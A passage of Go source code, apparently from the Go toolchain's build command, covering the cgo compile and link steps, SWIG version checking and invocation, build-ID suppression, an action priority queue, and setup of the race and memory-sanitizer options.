	if cgoLibGccFile != "" {
		staticLibs = append(staticLibs, cgoLibGccFile)
	}

	cflags := stringList(cgoCPPFLAGS, cgoCFLAGS)
	for _, cfile := range cfiles {
		ofile := obj + cfile[:len(cfile)-1] + "o"
		if err := b.gcc(p, ofile, cflags, obj+cfile); err != nil {
			return nil, nil, err
		}
		linkobj = append(linkobj, ofile)
		if !strings.HasSuffix(ofile, "_cgo_main.o") {
			outObj = append(outObj, ofile)
		}
	}

	for _, file := range gccfiles {
		ofile := obj + cgoRe.ReplaceAllString(file[:len(file)-1], "_") + "o"
		if err := b.gcc(p, ofile, cflags, file); err != nil {
			return nil, nil, err
		}
		linkobj = append(linkobj, ofile)
		outObj = append(outObj, ofile)
	}

	cxxflags := stringList(cgoCPPFLAGS, cgoCXXFLAGS)
	for _, file := range gxxfiles {
		// Append .o to the file, just in case the pkg has file.c and file.cpp
		ofile := obj + cgoRe.ReplaceAllString(file, "_") + ".o"
		if err := b.gxx(p, ofile, cxxflags, file); err != nil {
			return nil, nil, err
		}
		linkobj = append(linkobj, ofile)
		outObj = append(outObj, ofile)
	}

	for _, file := range mfiles {
		// Append .o to the file, just in case the pkg has file.c and file.m
		ofile := obj + cgoRe.ReplaceAllString(file, "_") + ".o"
		if err := b.gcc(p, ofile, cflags, file); err != nil {
			return nil, nil, err
		}
		linkobj = append(linkobj, ofile)
		outObj = append(outObj, ofile)
	}

	linkobj = append(linkobj, p.SysoFiles...)
	dynobj := obj + "_cgo_.o"
	pie := (goarch == "arm" && goos == "linux") || goos == "android"
	if pie { // we need to use -pie for Linux/ARM to get accurate imported sym
		cgoLDFLAGS = append(cgoLDFLAGS, "-pie")
	}
	if err := b.gccld(p, dynobj, cgoLDFLAGS, linkobj); err != nil {
		return nil, nil, err
	}
	if pie { // but we don't need -pie for normal cgo programs
		cgoLDFLAGS = cgoLDFLAGS[0 : len(cgoLDFLAGS)-1]
	}

	if _, ok := buildToolchain.(gccgoToolchain); ok {
		// we don't use dynimport when using gccgo.
		return outGo, outObj, nil
	}

	// cgo -dynimport
	importGo := obj + "_cgo_import.go"
	cgoflags = []string{}
	if p.Standard && p.ImportPath == "runtime/cgo" {
		cgoflags = append(cgoflags, "-dynlinker") // record path to dynamic linker
	}
	if err := b.run(p.Dir, p.ImportPath, nil, buildToolExec, cgoExe, "-objdir", obj, "-dynpackage", p.Name, "-dynimport", dynobj, "-dynout", importGo, cgoflags); err != nil {
		return nil, nil, err
	}
	outGo = append(outGo, importGo)

	ofile := obj + "_all.o"
	var gccObjs, nonGccObjs []string
	for _, f := range outObj {
		if strings.HasSuffix(f, ".o") {
			gccObjs = append(gccObjs, f)
		} else {
			nonGccObjs = append(nonGccObjs, f)
		}
	}
	ldflags := stringList(bareLDFLAGS, "-Wl,-r", "-nostdlib", staticLibs)

	// We are creating an object file, so we don't want a build ID.
	ldflags = b.disableBuildID(ldflags)

	if err := b.gccld(p, ofile, ldflags, gccObjs); err != nil {
		return nil, nil, err
	}

	// NOTE(rsc): The importObj is a 5c/6c/8c object and on Windows
	// must be processed before the gcc-generated objects.
	// Put it first.  https://golang.org/issue/2601
	outObj = stringList(nonGccObjs, ofile)

	return outGo, outObj, nil
}

// Run SWIG on all SWIG input files.
// TODO: Don't build a shared library, once SWIG emits the necessary
// pragmas for external linking.
func (b *builder) swig(p *Package, obj string, pcCFLAGS []string) (outGo, outC, outCXX []string, err error) {
	if err := b.swigVersionCheck(); err != nil {
		return nil, nil, nil, err
	}

	intgosize, err := b.swigIntSize(obj)
	if err != nil {
		return nil, nil, nil, err
	}

	for _, f := range p.SwigFiles {
		goFile, cFile, err := b.swigOne(p, f, obj, pcCFLAGS, false, intgosize)
		if err != nil {
			return nil, nil, nil, err
		}
		if goFile != "" {
			outGo = append(outGo, goFile)
		}
		if cFile != "" {
			outC = append(outC, cFile)
		}
	}
	for _, f := range p.SwigCXXFiles {
		goFile, cxxFile, err := b.swigOne(p, f, obj, pcCFLAGS, true, intgosize)
		if err != nil {
			return nil, nil, nil, err
		}
		if goFile != "" {
			outGo = append(outGo, goFile)
		}
		if cxxFile != "" {
			outCXX = append(outCXX, cxxFile)
		}
	}
	return outGo, outC, outCXX, nil
}

// Make sure SWIG is new enough.
var (
	swigCheckOnce sync.Once
	swigCheck     error
)

func (b *builder) swigDoVersionCheck() error {
	out, err := b.runOut("", "", nil, "swig", "-version")
	if err != nil {
		return err
	}
	re := regexp.MustCompile(`[vV]ersion +([\d]+)([.][\d]+)?([.][\d]+)?`)
	matches := re.FindSubmatch(out)
	if matches == nil {
		// Can't find version number; hope for the best.
		return nil
	}

	major, err := strconv.Atoi(string(matches[1]))
	if err != nil {
		// Can't find version number; hope for the best.
		return nil
	}
	const errmsg = "must have SWIG version >= 3.0.6"
	if major < 3 {
		return errors.New(errmsg)
	}
	if major > 3 {
		// 4.0 or later
		return nil
	}

	// We have SWIG version 3.x.
	if len(matches[2]) > 0 {
		minor, err := strconv.Atoi(string(matches[2][1:]))
		if err != nil {
			return nil
		}
		if minor > 0 {
			// 3.1 or later
			return nil
		}
	}

	// We have SWIG version 3.0.x.
	if len(matches[3]) > 0 {
		patch, err := strconv.Atoi(string(matches[3][1:]))
		if err != nil {
			return nil
		}
		if patch < 6 {
			// Before 3.0.6.
			return errors.New(errmsg)
		}
	}

	return nil
}

func (b *builder) swigVersionCheck() error {
	swigCheckOnce.Do(func() {
		swigCheck = b.swigDoVersionCheck()
	})
	return swigCheck
}

// This code fails to build if sizeof(int) <= 32
const swigIntSizeCode = `
package main
const i int = 1 << 32
`

// Determine the size of int on the target system for the -intgosize option
// of swig >= 2.0.9
func (b *builder) swigIntSize(obj string) (intsize string, err error) {
	if buildN {
		return "$INTBITS", nil
	}
	src := filepath.Join(b.work, "swig_intsize.go")
	if err = ioutil.WriteFile(src, []byte(swigIntSizeCode), 0644); err != nil {
		return
	}
	srcs := []string{src}

	p := goFilesPackage(srcs)

	if _, _, e := buildToolchain.gc(b, p, "", obj, false, nil, srcs); e != nil {
		return "32", nil
	}
	return "64", nil
}

// Run SWIG on one SWIG input file.
func (b *builder) swigOne(p *Package, file, obj string, pcCFLAGS []string, cxx bool, intgosize string) (outGo, outC string, err error) {
	cgoCPPFLAGS, cgoCFLAGS, cgoCXXFLAGS, _ := b.cflags(p, true)
	var cflags []string
	if cxx {
		cflags = stringList(cgoCPPFLAGS, pcCFLAGS, cgoCXXFLAGS)
	} else {
		cflags = stringList(cgoCPPFLAGS, pcCFLAGS, cgoCFLAGS)
	}

	n := 5 // length of ".swig"
	if cxx {
		n = 8 // length of ".swigcxx"
	}
	base := file[:len(file)-n]
	goFile := base + ".go"
	gccBase := base + "_wrap."
	gccExt := "c"
	if cxx {
		gccExt = "cxx"
	}

	_, gccgo := buildToolchain.(gccgoToolchain)

	// swig
	args := []string{
		"-go",
		"-cgo",
		"-intgosize", intgosize,
		"-module", base,
		"-o", obj + gccBase + gccExt,
		"-outdir", obj,
	}

	for _, f := range cflags {
		if len(f) > 3 && f[:2] == "-I" {
			args = append(args, f)
		}
	}

	if gccgo {
		args = append(args, "-gccgo")
		if pkgpath := gccgoPkgpath(p); pkgpath != "" {
			args = append(args, "-go-pkgpath", pkgpath)
		}
	}
	if cxx {
		args = append(args, "-c++")
	}

	out, err := b.runOut(p.Dir, p.ImportPath, nil, "swig", args, file)
	if err != nil {
		if len(out) > 0 {
			if bytes.Contains(out, []byte("-intgosize")) || bytes.Contains(out, []byte("-cgo")) {
				return "", "", errors.New("must have SWIG version >= 3.0.6")
			}
			b.showOutput(p.Dir, p.ImportPath, b.processOutput(out)) // swig error
			return "", "", errPrintedOutput
		}
		return "", "", err
	}
	if len(out) > 0 {
		b.showOutput(p.Dir, p.ImportPath, b.processOutput(out)) // swig warning
	}

	return obj + goFile, obj + gccBase + gccExt, nil
}

// disableBuildID adjusts a linker command line to avoid creating a
// build ID when creating an object file rather than an executable or
// shared library.  Some systems, such as Ubuntu, always add
// --build-id to every link, but we don't want a build ID when we are
// producing an object file.  On some of those system a plain -r (not
// -Wl,-r) will turn off --build-id, but clang 3.0 doesn't support a
// plain -r.  I don't know how to turn off --build-id when using clang
// other than passing a trailing --build-id=none.  So that is what we
// do, but only on systems likely to support it, which is to say,
// systems that normally use gold or the GNU linker.
func (b *builder) disableBuildID(ldflags []string) []string {
	switch goos {
	case "android", "dragonfly", "linux", "netbsd":
		ldflags = append(ldflags, "-Wl,--build-id=none")
	}
	return ldflags
}

// An actionQueue is a priority queue of actions.
type actionQueue []*action

// Implement heap.Interface
func (q *actionQueue) Len() int           { return len(*q) }
func (q *actionQueue) Swap(i, j int)      { (*q)[i], (*q)[j] = (*q)[j], (*q)[i] }
func (q *actionQueue) Less(i, j int) bool { return (*q)[i].priority < (*q)[j].priority }
func (q *actionQueue) Push(x interface{}) { *q = append(*q, x.(*action)) }
func (q *actionQueue) Pop() interface{} {
	n := len(*q) - 1
	x := (*q)[n]
	*q = (*q)[:n]
	return x
}

func (q *actionQueue) push(a *action) {
	heap.Push(q, a)
}

func (q *actionQueue) pop() *action {
	return heap.Pop(q).(*action)
}

func instrumentInit() {
	if !buildRace && !buildMSan {
		return
	}
	if buildRace && buildMSan {
		fmt.Fprintf(os.Stderr, "go %s: may not use -race and -msan simultaneously", flag.Args()[0])
		os.Exit(2)
	}
	if goarch != "amd64" || goos != "linux" && goos != "freebsd" && goos != "darwin" && goos != "windows" {
		fmt.Fprintf(os.Stderr, "go %s: -race and -msan are only supported on linux/amd64, freebsd/amd64, darwin/amd64 and windows/amd64\n", flag.Args()[0])
		os.Exit(2)
	}
	if !buildContext.CgoEnabled {
		fmt.Fprintf(os.Stderr, "go %s: -race requires cgo; enable cgo by setting CGO_ENABLED=1\n", flag.Args()[0])
		os.Exit(2)
	}
	if buildRace {
		buildGcflags = append(buildGcflags, "-race")
		buildLdflags = append(buildLdflags, "-race")
	} else {
		buildGcflags = append(buildGcflags, "-msan")
		buildLdflags = append(buildLdflags, "-msan")
	}
	if buildContext.InstallSuffix != "" {
		buildContext.InstallSuffix += "_"
	}

	if buildRace {
		buildContext.InstallSuffix += "race"
		buildContext.BuildTags = append(buildContext.BuildTags, "race")
	} else {
		buildContext.InstallSuffix += "msan"
		buildContext.BuildTags = append(buildContext.BuildTags, "msan")
	}
}
